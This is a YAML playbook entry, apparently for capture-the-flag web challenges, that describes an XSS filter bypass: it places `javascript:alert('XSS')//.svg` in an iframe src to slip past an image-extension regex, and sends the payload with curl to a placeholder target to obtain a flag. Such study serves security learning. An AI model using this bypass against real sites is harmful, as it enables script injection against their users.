name: xss_javascript_protocol_iframe
category: web
tags: [xss, javascript_protocol, iframe, filter_bypass]
indicators:
  - "iframe src attribute with user input"
  - "URL whitelist with image extensions"
  - "Double quotes and angle brackets filtered"
  - "Regex-based URL validation"

tricks:
  - name: "Step 1: Identify filter rules"
    when: "Found iframe src input"
    how: "Analyze regex and character filters"
    payload: |
      # Filtered: " (double quotes), < > (angle brackets)
      # URL regex: must end with image extension (jpg, jpeg, png, gif, bmp, svg)
      # Or use http/https/file protocol

  - name: "Step 2: Use javascript: protocol bypass"
    when: "iframe src accepts javascript:"
    how: "Combine javascript: with image extension trick"
    payload: |
      javascript:alert('XSS')//.svg
      # javascript: executes JS code
      # // comments out the .svg suffix in JS
      # .svg satisfies the image extension regex

  - name: "Step 3: Trigger XSS and get flag"
    when: "Execute attack"
    how: "Send payload via url parameter"
    payload: |
      curl "http://TARGET/page?url=javascript:alert('XSS')//.svg"
      # Response: Congratulations! Here is the flag: flag{...}

  - name: "Alternative: Other extension tricks"
    when: "Need variations"
    how: "Try other image extensions"
    payload: |
      javascript:alert('XSS')//.jpg
      javascript:alert('XSS')//.png
      javascript:alert('XSS')//.gif

